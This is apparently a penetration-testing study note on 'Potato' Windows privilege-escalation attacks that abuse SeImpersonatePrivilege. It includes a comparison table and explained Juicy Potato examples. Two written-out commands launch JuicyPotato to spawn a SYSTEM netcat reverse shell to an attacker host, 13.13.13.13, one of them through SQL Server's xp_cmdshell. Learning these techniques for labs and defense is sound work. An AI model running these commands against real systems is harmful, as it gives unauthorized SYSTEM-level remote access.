---
icon: potato
---

# Potatoes

## <mark style="color:yellow;">About</mark>

<mark style="color:red;">**Potato-styled attacks**</mark> is <mark style="color:purple;">**Windows privilege escalation techniques**</mark> that exploit <mark style="color:orange;">**token impersonation**</mark>**,&#x20;**<mark style="color:orange;">**NTLM relay**</mark>**, and&#x20;**<mark style="color:orange;">**COM/DCOM misconfigurations**</mark> to gain <mark style="color:green;">`SYSTEM`</mark> privileges from a lower-privileged service account. These attacks target specific **privileges assigned to service accounts**, such as:

* <mark style="color:green;">`SeImpersonatePrivilege`</mark> – Allows impersonation of another user's token.
* <mark style="color:green;">`SeAssignPrimaryTokenPrivilege`</mark> – Allows assignment of a token to a process.

### <mark style="color:yellow;">Common Principles:</mark>

1. <mark style="color:blue;">**Privilege Escalation via Token Impersonation**</mark>
   * They exploit <mark style="color:green;">`SeImpersonatePrivilege`</mark> to impersonate a SYSTEM token.
   * Some variants also abuse <mark style="color:green;">`SeAssignPrimaryTokenPrivilege`</mark> to assign SYSTEM tokens to processes.
2. <mark style="color:blue;">**Exploitation of Windows Authentication or COM Services**</mark>
   * **Older Potatoes (Rotten, Juicy)**: Use **DCOM activation** to trigger SYSTEM-level COM objects.
   * **Newer Potatoes (Sweet, Bad, Rogue, Print)**: Leverage **NTLM authentication relay** and **RPC abuse** to request privileged tokens.
3. <mark style="color:blue;">**No Exploits Needed – Just Misuse of Windows Features**</mark>
   * These attacks work **without exploiting a software vulnerability**—they abuse **legitimate Windows functionalities** like COM objects, NTLM relay, and DCOM interfaces.

### <mark style="color:yellow;">**Comparison of Major Potato Attacks**</mark>

| **Exploit**       | **Method Used**                    | **Target Privileges**                                                                                                         | **Works on Modern Windows?**    |
| ----------------- | ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- | ------------------------------- |
| **Rotten Potato** | NTLM Relay (Fake RPC server)       | <mark style="color:green;">`SeImpersonatePrivilege`</mark>                                                                    | ❌ (Patched)                     |
| **Juicy Potato**  | COM Object Spoofing (CLSID)        | <mark style="color:green;">`SeImpersonatePrivilege`</mark>                                                                    | ❌ (Patched, requires CLSID)     |
| **Sweet Potato**  | NTLM Relay via DCOM Task Scheduler | <mark style="color:green;">`SeImpersonatePrivilege`</mark>, <mark style="color:green;">`SeAssignPrimaryTokenPrivilege`</mark> | ✅ (Works on modern Windows)     |
| **Rogue Potato**  | RPC/DCOM NTLM Capture              | <mark style="color:green;">`SeImpersonatePrivilege`</mark>                                                                    | ✅ (Bypasses Juicy Potato patch) |
| **PrintSpoofer**  | Named Pipe + Print Spooler Trick   | <mark style="color:green;">`SeImpersonatePrivilege`</mark>                                                                    | ✅ (Works on modern Windows)     |

## <mark style="color:yellow;">Juicy Potato</mark>

In Windows, every process has a <mark style="color:purple;">**token containing account information**</mark>, which can be exploited if the <mark style="color:green;">`SeImpersonatePrivilege`</mark> privilege is available. This privilege, often found in **service accounts**, allows a process to impersonate another, enabling privilege escalation from <mark style="color:purple;">**Administrator to SYSTEM**</mark>.

Legitimate programs use this for tasks like calling **WinLogon** to obtain a SYSTEM token. Attackers exploit this via <mark style="color:orange;">**Potato-style attacks**</mark> tricking a SYSTEM process into connecting to a malicious one, allowing token theft.

This privilege is common in <mark style="color:yellow;">**web shells, Jenkins RCE, and MSSQL command execution**</mark>. If found, it often provides an easy path to SYSTEM access. Always check for it after gaining code execution.

### **Example**

```sql
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 13.13.13.13 1337 -e cmd.exe" -t *
```

1. <mark style="color:blue;">**Execute Juicy Potato via**</mark> <mark style="color:green;">`xp_cmdshell`</mark>

* <mark style="color:green;">`xp_cmdshell`</mark> allows OS command execution in **SQL Server**.
* If enabled, it can run Juicy Potato under the SQL Server service account.
* The service account often has <mark style="color:green;">`SeImpersonatePrivilege`</mark>, which is required for Juicy Potato.

2. <mark style="color:blue;">**Abuse Token Impersonation**</mark>

* Juicy Potato listens on port <mark style="color:green;">`53375`</mark> for a COM request (<mark style="color:green;">`-l 53375`</mark>).
* It spawns <mark style="color:green;">`cmd.exe`</mark> <mark style="color:green;"></mark><mark style="color:green;">(</mark><mark style="color:green;">`-p c:\windows\system32\cmd.exe`</mark>) and executes a **reverse shell** with <mark style="color:green;">`nc.exe`</mark>.
* The attack succeeds if the SQL Server service can **impersonate SYSTEM**.

3. <mark style="color:blue;">**Reverse Shell Execution via Netcat**</mark>

*   <mark style="color:green;">`cmd.exe`</mark> runs with SYSTEM privileges and executes:

    ```bash
    c:\tools\nc.exe 13.13.13.13 1337 -e cmd.exe
    ```
* This connects back to <mark style="color:yellow;">**13.13.13.13:1337 (attacker host)**</mark>, giving an attacker **SYSTEM** shell access.

### &#x20;Example 2

I used this example for one task in Academy, used it from command injection powershell reverse shell

```powershell
.\JuicyPotato.exe -l 53375 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}" -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe -e cmd.exe 13.13.13.13 9999" -t *
```
